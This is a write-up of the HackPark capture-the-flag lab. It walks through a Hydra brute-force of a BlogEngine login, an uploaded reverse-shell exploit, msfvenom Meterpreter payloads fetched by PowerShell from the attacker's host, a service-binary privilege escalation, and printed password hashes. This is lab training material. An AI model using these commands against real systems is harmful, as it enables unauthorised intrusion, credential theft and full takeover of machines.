# HackPark
#### Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!
#### [Room Link](1)

## Tasks
### 1. Deploy the Machine and connect to our network
  Start by deploying the machine and scan with NMAP
  `nmap -sV -sC -Pn -oN nmap_basic.txt [machineIP]` and see that all the ports are filtered.
  We can then run it again to test all ports using `nmap -A -oN nmap_allports.txt [machineIP]`.

  ```
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 14:00 EDT
Nmap scan report for [machineIP]
Host is up (0.14s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries
| /Account/*.* /search /search.aspx /error404.aspx
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2020-03-20T18:01:17+00:00; +1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.03 seconds

  ```

  While that is running we also can check out the webserver here:

  ![hackparkwebpage][2]

  We can see that creepy clown is the one and only PennyWise.

  Lets also throw a gobuster in the background while we check out the next portion with
  `gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://[machineIP]`


### 2. Using Hydra to brute-force a login
  We can see by checking out the login page in the network tab on Firefox that it sends a
  POST request with an .aspx form.  
  ![ASPXPostRequest][3]


  From there we are suppose to crack using Hydra on the login page.
  `hydra -l <username> -P /usr/share/wordlists/<wordlist> [machineIP] http-post-form`

  we can guess the username from the original post to be `Admin`
  then from that we can formulate the hydra command that is necessary by first getting the correct params.
  The hydra http-post-form takes 3 arguments separated by ':'. The first is the page on the server
to GET or POST to, the second is the POST/GET variables (taken from either
the browser, or a proxy such as BurpSuite) with the varying usernames and passwords
in the "^USER^" and "^PASS^" placeholders, the third is the string that it
checks for an *invalid* or *valid* login - any exception to this is counted
as a success.
 So for our hydra request we are using
 1: /Account/login.aspx
 2:  Request Params we find in burpsuite repeater ( via proxying a login request to the website via Burp Proxy, sending it to Burp Repeater via Ctrl+R, Then copying its request params given over to our command )
 3: "Login Failed" (Our "common case", what is expected if it doesnt see "Login Failed" it will return a success.)

  `hydra -v -l admin -P /usr/share/wordlists/rockyou.txt [machineIP] http-post-form "/Account/login.aspx:__VIEWSTATE=%2BzSkE5rKklYx2evyff1oZJyuSWT7%2FP%2BrwCqOuY9eQFnN3I9b9H%2FemK0b4edjD%2BX4D0kYN6MJXUIltXwXt0PReeyBxoseUQg%2BlNpW6CHIGWNzl%2FGSvdwSZX179PJ%2FI3%2F64LNM7KzKj9sc4BMO83WdCE0KH%2FPjXAKd4RAQ7poy1tOiO7cd&__EVENTVALIDATION=8UPWUPAn6s7hJvO0Pl8kCCO3NAmIgs7nlpsgIlY%2FBUKl7fwtvPmUalPJ5PygYkVuz1H356PzRXwi%2FHQ3z8iJpgXHs8%2BloBQ4qlIePP6FdcvcR2qoLptuS0C5xNkNhrzvN5IJshWQx%2BF3kjK4PfMhuSyiPjbKZA2aFsYrqvz5b2BHveGR&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"`

  After running for a bit we get a result

  `[80][http-post-form] host: 10.10.128.86   login: admin   password: [REDACTED]`

  Logging in on the log-on page we gain access the Administrator account

  Going down to `http://10.10.128.86/admin/about.cshtml`  we see all this information
  ![blogengineinfo][4]

  We can identify the version of the BlogEngine as  3.3.6.0.

  When we search `exploit-db.com` with BlogEngine 3.3.6.0 we find several vulnerabilies we can use.
  We can see the exploit path [here](5).

  We see that first we have to edit the script to set to our local IP and the local port we will listen on. In another terminal go ahead and use `nmap -lvnp [lport]` to setup that listener.

   We also need to rename the edited file to `PostView.ascx` per the instructions.

  Then upload the edited file using the link in the image
  ![filemanagerbutton][6]

  After uploading we can then browse to `http://[machineIP]/?theme=../../App_Data/files`
  to execute the reverse shell, go back to the terminal with nc session and there should be a command prompt for you.

  We can quickly run `whoami` to get the results
  ```
  iis apppool\blog
  ```
  and confirm access on the machine.
## 3. Compromise the machine

  Now that we have our reverse shell lets upgrade it to a full reverse shell.

   To best do that, lets use MSF again. Using `msfvenom` we can quickly create reverse handlers
   with hosts and ports baked in.
   To do that we setup
   `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[vpnIP] LPORT=[LPORT] -f exe > reverse.exe`

   Now that we have that lets setup a meterpreter handler in another terminal to accept it.

   Loading up `msfconsole` and  run `use exploit/multi/handler`

   Set the correct options for your machine ( by using `options` then `set [option]` for required) then go back to the cmd shell, move over to the `C:\Windows\temp` to copy over your reverse_tcp shell exe and run it.

   `powershell Invoke-WebRequest -Uri http://10.8.30.155:1337/reverse.exe -Outfile reverse.exe`

   run it by just typing `reverse.exe` and you should see it come into your meterpreter terminal
   See what session it is with `sessions -l` then take control with `sessions -i [id]` to take over that shell.

   We can see by running the meterpreter command `sysinfo` we get certain information.
   ```
   meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
   ```
   running `ps` to see what processes are running.
   ```
   meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User              Path
 ---   ----  ----                  ----  -------  ----              ----
 0     0     [System Process]                                       
 4     0     System                                                 
 348   672   svchost.exe                                            
 352   672   TrustedInstaller.exe                                   
 380   4     smss.exe                                               
 524   516   csrss.exe                                              
 580   572   csrss.exe                                              
 588   516   wininit.exe                                            
 616   572   winlogon.exe                                           
 672   588   services.exe                                           
 680   588   lsass.exe                                              
 740   672   svchost.exe                                            
 784   672   svchost.exe                                            
 856   740   WmiPrvSE.exe                                           
 868   672   svchost.exe                                            
 884   616   dwm.exe                                                
 892   2648  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 912   672   svchost.exe                                            
 944   672   svchost.exe                                            
 996   672   svchost.exe                                            
 1140  672   spoolsv.exe                                            
 1168  672   amazon-ssm-agent.exe                                   
 1204  740   TiWorker.exe                                           
 1212  672   svchost.exe                                            
 1228  672   LiteAgent.exe                                          
 1304  672   svchost.exe                                            
 1320  672   svchost.exe                                            
 1364  672   WService.exe                                           
 1508  672   wlms.exe                                               
 1516  1364  WScheduler.exe                                         
 1532  672   Ec2Config.exe                                          
 1572  2648  powershell.exe        x64   0        IIS APPPOOL\Blog  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 1624  740   SppExtComObj.Exe                                       
 1640  2588  ServerManager.exe                                      
 1752  672   msdtc.exe                                              
 1880  2452  WScheduler.exe                                         
 1888  672   sppsvc.exe                                             
 1964  672   svchost.exe                                            
 2028  672   vds.exe                                                
 2136  2524  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 2352  2524  reverse.exe           x86   0        IIS APPPOOL\Blog  c:\Windows\Temp\reverse.exe
 2356  740   WmiPrvSE.exe                                           
 2524  3032  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 2552  912   taskhostex.exe                                         
 2588  1880  Message.exe                                            
 2628  2608  explorer.exe                                           
 2648  3032  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 3032  1320  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
   ```

   Once we get that info lets run it through our recommended `windows-privilege-escalation` script to see what we get.

   We have to first update the database with `./windows-exploit-suggester.py --update`
   After that we run `windows-exploit-suggester.py -d [databasePath] --systeminfo [systeminfotxtPath]` with `[systeminfotxtPath]` containing the output of `systeminfo` from the msfconsole.

  We can see the results [here](7)

  From these we can look through a few (looking for ones with Metasploit modules) and see
  what works.

  While running though through the `ps` command we see that a `Message.exe` keeps running then shutting down within the services.

  So additional combing through the log we can find the update logs of the `System Scheduler Professional - Version 5.12` which has a vulnerability to replacing its service with a vulnerable exe with the same name and it will eventually call out to our handler with a hopefully privileged shell. This is explained more [here](8). https://www.exploit-db.com/exploits/45072

  First lets setup another Metasploit handler by backgrounding(`ctrl+z`) our current session, set another [LPORT] then exploit in a background session with `exploit -j`.

  Then lets generate another binary named `Message.exe` with msfvenom using
  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[vpnIP] LPORT=[LPORT2] -f exe > Message.exe`
  then download it over to the hackpark machine with
  `powershell Invoke-WebRequest -Uri http://[vpnIP]:[LPORT2]/Message.exe -Outfile Message.exe`

  After uploading that into the correct directory(search for that program directory to find where to replace at.), once it executes it you should get the meterpreter shell. Running `getuid` you get `Server username: HACKPARK\Administrator`. From
  there we can explore the machine more convert to System if wanted. However Administrator is good enough for us for now and we can complete the box.

  Going to `c:\Users\jeff\Desktop\user.txt` we get `[REDACTED]`
  then going into `c:\Users\Administrator\Desktop\root.txt` we get `[REDACTED]`

  We can also try to find the service that was running Message.exe by enumerating a bit further with powershell & tasklist.
a
  TO also further exploit I got the hashes for every user to exploit if I needed
  ```
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:3352c0731470aabf133e0c84276adcba:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  jeff:1001:aad3b435b51404eeaad3b435b51404ee:e7dd0bd78b1d5d7eea4ee746816e2377:::
  ```

but after searching and reviewing the exploit page again, trying to find the *service* name we are exploiting. I looked into service enumeration with the metasploit module `use Post/Windows/Gather/Enum_Services`. After running this and seeing the output I saw that the service name isnt always the .exe name. But if you combine the two you can get the service.exe you are looking for.

## Review

Overall this box was a good test of skills in the OSCP path. Even with a writeup it still would be difficult to
do this without much experience. The questions for the box are a little weird on this one, however keep trying what it SHOULD BE and trust there is a solution. (Remember the stars correspond to the length of the flag in TryHackMe. )

[1]: https://tryhackme.com/room/hackpark
[2]: https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/hackpark/resources/hackpark_web80.png
[3]: https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/hackpark/resources/hackpark_aspxlogin80.png
[4]: https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/hackpark/resources/hackpark_adminabout80.png
[5]: https://www.exploit-db.com/exploits/46353
[6]: https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/hackpark/resources/hackpark_filebutton80.png
[7]: ./resources/hackpack_winexploit_suggestions.txt
[8]: https://www.exploit-db.com/exploits/45072
